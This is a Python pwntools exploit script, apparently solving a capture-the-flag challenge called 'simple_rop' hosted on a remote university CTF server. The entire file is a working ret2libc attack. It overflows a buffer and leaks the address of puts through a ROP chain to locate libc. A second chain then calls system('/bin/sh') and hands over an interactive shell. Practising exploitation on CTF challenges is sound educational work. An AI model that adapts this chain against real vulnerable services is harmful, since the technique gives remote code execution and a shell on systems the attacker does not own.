#!/usr/bin/python3

from pwn import *
from rich import print

elf = ELF("simple_rop")
rop = ROP(elf)

rop.call(elf.symbols["puts"], [elf.got["puts"]])
rop.call(elf.symbols["main"])

offset = 28
payload = b"A" * offset + rop.chain()

DEBUG = False

if DEBUG:
    p = process('./simple_rop')

else:
    p = remote('ctf-fsi.fe.up.pt', 7008)

print(p.recvline())
p.sendline(payload)

puts_address = u32(p.recvline()[:4])
libc_address = puts_address - elf.libc.symbols["puts"]

libc = elf.libc
libc.address = libc_address

rop = ROP([elf, libc])

bin_sh = next(libc.search(b"/bin/sh\x00"))
system = libc.sym["system"]

rop.call(system, [bin_sh])

print(rop.dump())

payload = b"A" * offset + rop.chain()

print(p.recvline())
p.sendline(payload)
p.interactive()